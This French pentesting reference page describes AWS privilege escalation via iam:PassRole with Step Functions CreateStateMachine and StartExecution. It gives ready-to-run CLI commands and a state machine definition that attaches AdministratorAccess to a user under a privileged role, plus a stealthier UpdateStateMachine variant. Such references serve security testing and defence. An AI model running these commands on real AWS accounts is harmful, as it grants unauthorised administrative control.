---
title: "Step Functions : PassRole vers CreateStateMachine pour un rôle privilégié"
description: "iam:PassRole combiné à states:CreateStateMachine et states:StartExecution pour exécuter des tâches arbitraires sous un rôle de machine à états privilégié."
keywords:
  - PassRole
  - Step Functions
  - CreateStateMachine
  - StartExecution
  - state machine
  - privilege escalation
---

# Step Functions

Avec `iam:PassRole` et `states:CreateStateMachine` (plus `states:StartExecution`), vous définissez une machine à états qui exécute des tâches sous un **rôle d'exécution** privilégié et vous la démarrez. Le rôle de la machine à états est celui que vous transmettez : toute action que ses tâches invoquent, un appel Lambda, une intégration SDK, une tâche optimisée `aws-sdk:*`, s'exécute donc avec les permissions de ce rôle.

## Créer et lancer une machine à états

```bash
# a minimal machine that calls an AWS SDK action under the passed role
cat > def.json <<'EOF'
{"Comment":"x","StartAt":"call","States":{
  "call":{"Type":"Task","Resource":"arn:aws:states:::aws-sdk:iam:attachUserPolicy",
    "Parameters":{"UserName":"me","PolicyArn":"arn:aws:iam::aws:policy/AdministratorAccess"},
    "End":true}}}
EOF
aws stepfunctions create-state-machine --name x \
  --role-arn arn:aws:iam::<acct>:role/<privileged-role> \
  --definition file://def.json
aws stepfunctions start-execution --state-machine-arn <arn>
```

L'intégration de service `aws-sdk` permet à un seul appel d'état d'invoquer presque n'importe quelle API directement en tant que rôle, de sorte que la machine n'a même pas besoin d'une Lambda pour transporter la charge utile.

## Notes d'exploitation

- La politique de confiance du rôle transmis doit autoriser `states.amazonaws.com`, ce qui est standard pour tout rôle conçu pour Step Functions.
- `states:UpdateStateMachine` sur une machine existante qui porte déjà un rôle privilégié est une variante plus discrète : remplacez sa définition plutôt que d'en créer une.
- La sortie de chaque tâche est capturée dans l'historique d'exécution (`get-execution-history`), de sorte que les résultats reviennent sans aucune infrastructure de rappel.

## Outils

- **AWS CLI** (`stepfunctions create-state-machine` / `start-execution` / `get-execution-history`).
- **Pacu** (`iam__privesc_scan`) : signale l'ensemble de rôles capables de PassRole que ceci exploite.

## Références

- [BishopFox : iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [AWS : intégrations de service AWS SDK pour Step Functions](https://docs.aws.amazon.com/step-functions/latest/dg/supported-services-awssdk.html)
- [HackTricks Cloud : élévation de privilèges AWS Step Functions](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-states-privesc.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
